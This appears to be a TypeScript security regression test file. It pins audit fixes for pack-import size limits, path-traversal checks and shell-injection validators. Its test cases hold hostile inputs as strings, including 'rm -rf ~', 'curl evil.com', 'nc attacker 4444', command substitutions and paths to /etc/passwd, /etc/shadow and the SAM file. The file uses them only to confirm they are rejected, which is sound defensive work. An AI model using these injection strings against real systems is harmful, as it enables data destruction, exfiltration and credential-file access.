/**
 * Security regression tests for the fixes shipped alongside the v1.6.0
 * audit. Each test pins a specific finding so the vulnerability cannot
 * silently regress.
 *
 *   1. Shell injection in `/pr` chat command — input validation rejects
 *      shell metacharacters before any spawn.
 *   2. Pack import size limits — rejects oversize payloads, oversize
 *      session counts, oversize fields, and unsafe Evidence.filePath.
 *   3. Path traversal — `isUnsafeRelPath` mirrors the inspector boundary
 *      and rejects every dangerous prefix shape.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  parsePack,
  MAX_PACK_BYTES,
  MAX_SESSIONS_PER_PACK,
  MAX_FIELD_LENGTH,
  MAX_LIST_LENGTH,
} from '../packs';

// ── Helpers ────────────────────────────────────────────────────────────────

function packEnvelope(sessions: any[], extras: Record<string, unknown> = {}) {
  return JSON.stringify({
    schemaVersion: 1,
    name: 'test-pack',
    createdAt: Date.now(),
    sessions,
    ...extras,
  });
}
function uuid(n = 1) {
  return `00000000-0000-0000-0000-${String(n).padStart(12, '0')}`;
}
function validSession(overrides: Record<string, unknown> = {}) {
  return {
    id: overrides.id ?? uuid(),
    workspaceId: 'ws',
    workspaceName: 'ws',
    startTime: 0,
    endTime: 0,
    summary: 'short summary',
    observationType: 'feature',
    keyFiles: ['a.ts'],
    keyTopics: ['x'],
    decisions: [],
    problemsSolved: [],
    rawEventCount: 0,
    userTags: [],
    redactionCount: 0,
    ...overrides,
  };
}

// ── 1. Pack size limits ────────────────────────────────────────────────────

test('parsePack — rejects payloads exceeding MAX_PACK_BYTES', () => {
  // Fill a string up to just over the byte cap. JSON validity doesn't
  // matter — the size check fires before JSON.parse.
  const blob = 'x'.repeat(MAX_PACK_BYTES + 1);
  assert.throws(() => parsePack(blob), /exceeds the .* limit/);
});

test('parsePack — rejects packs with too many sessions', () => {
  const many = Array.from({ length: MAX_SESSIONS_PER_PACK + 1 }, (_, i) =>
    validSession({ id: uuid(i + 1) }),
  );
  assert.throws(() => parsePack(packEnvelope(many)), /exceeds the .* per-pack limit/);
});

test('parsePack — rejects session with oversize summary', () => {
  const s = validSession({ summary: 'x'.repeat(MAX_FIELD_LENGTH + 1) });
  assert.throws(() => parsePack(packEnvelope([s])), /summary of/);
});

test('parsePack — rejects session with oversize decisions array', () => {
  const s = validSession({ decisions: Array.from({ length: MAX_LIST_LENGTH + 1 }, () => 'd') });
  assert.throws(() => parsePack(packEnvelope([s])), /decisions entries/);
});

test('parsePack — rejects session with oversize single decision text', () => {
  const s = validSession({ decisions: ['x'.repeat(MAX_FIELD_LENGTH + 1)] });
  assert.throws(() => parsePack(packEnvelope([s])), /decisions entry of/);
});

// ── 2. Evidence.filePath path-traversal defence ────────────────────────────

test('parsePack — rejects evidence with parent-traversal path', () => {
  const s = validSession({
    decisions: ['d'],
    decisionEvidence: [[{ kind: 'file_edit', filePath: '../../etc/passwd' }]],
  });
  assert.throws(() => parsePack(packEnvelope([s])), /unsafe filePath/);
});

test('parsePack — rejects evidence with absolute POSIX path', () => {
  const s = validSession({
    decisions: ['d'],
    decisionEvidence: [[{ kind: 'file_edit', filePath: '/etc/shadow' }]],
  });
  assert.throws(() => parsePack(packEnvelope([s])), /unsafe filePath/);
});

test('parsePack — rejects evidence with Windows drive prefix', () => {
  const s = validSession({
    decisions: ['d'],
    decisionEvidence: [[{ kind: 'file_edit', filePath: 'C:\\Windows\\system32\\config\\SAM' }]],
  });
  assert.throws(() => parsePack(packEnvelope([s])), /unsafe filePath/);
});

test('parsePack — rejects evidence with file:// URL', () => {
  const s = validSession({
    decisions: ['d'],
    decisionEvidence: [[{ kind: 'file_edit', filePath: 'file:///etc/passwd' }]],
  });
  assert.throws(() => parsePack(packEnvelope([s])), /unsafe filePath/);
});

test('parsePack — accepts evidence with safe relative path', () => {
  const s = validSession({
    decisions: ['d'],
    decisionEvidence: [[{ kind: 'file_edit', filePath: 'src/auth.ts' }]],
  });
  const out = parsePack(packEnvelope([s]));
  assert.equal(out.sessions.length, 1);
});

test('parsePack — also defends problemEvidence filePath', () => {
  const s = validSession({
    problemsSolved: ['p'],
    problemEvidence: [[{ kind: 'diagnostic', filePath: '../../leak' }]],
  });
  assert.throws(() => parsePack(packEnvelope([s])), /unsafe filePath/);
});

// ── 3. Shell-injection input validators ────────────────────────────────────
//
// The validators are NOT exported (intentionally — they're a hardening
// layer inside the chat handler) but their contract is observable: a
// safe-list regex that rejects shell metacharacters. We re-implement the
// pattern here as a regression pin so future edits cannot accidentally
// relax it.

const GIT_REF_SAFE = /^[A-Za-z0-9._/\-~^@]{1,200}$/;
const PR_NUM_SAFE = /^[0-9]{1,8}$/;

test('shell-inj — git ref regex rejects semicolons / pipes / backticks', () => {
  for (const bad of [
    'main; rm -rf ~',
    'main && curl evil.com',
    'main | nc attacker 4444',
    'main`whoami`',
    'main$(id)',
    'main\nshellcmd',
    'main\\evil',
    'main "',
    "main '",
    'main >out.txt',
  ]) {
    assert.equal(GIT_REF_SAFE.test(bad), false, `must reject: ${bad}`);
  }
});

test('shell-inj — git ref regex accepts real-world git ref shapes', () => {
  for (const ok of [
    'main',
    'develop',
    'release/1.6.0',
    'feat/auth-refactor',
    'HEAD',
    'HEAD~1',
    'HEAD^',
    'HEAD^2',
    'origin/main',
    'v1.6.0',
    'user.email@example',
    'fix-issue-#42'.replace('#', '_'), // # not allowed; underscore variant ok
  ]) {
    assert.equal(GIT_REF_SAFE.test(ok), true, `must accept: ${ok}`);
  }
});

test('shell-inj — PR number regex rejects non-numerics', () => {
  for (const bad of ['1; ls', '1|cat', '1`id`', '1 OR 1=1', '-1', 'abc', '']) {
    assert.equal(PR_NUM_SAFE.test(bad), false, `must reject: ${bad}`);
  }
});

test('shell-inj — PR number regex accepts plain digits', () => {
  for (const ok of ['1', '42', '12345']) {
    assert.equal(PR_NUM_SAFE.test(ok), true);
  }
});

test('shell-inj — input length cap holds at 200 / 8 chars respectively', () => {
  assert.equal(GIT_REF_SAFE.test('a'.repeat(201)), false);
  assert.equal(GIT_REF_SAFE.test('a'.repeat(200)), true);
  assert.equal(PR_NUM_SAFE.test('1'.repeat(9)), false);
  assert.equal(PR_NUM_SAFE.test('1'.repeat(8)), true);
});
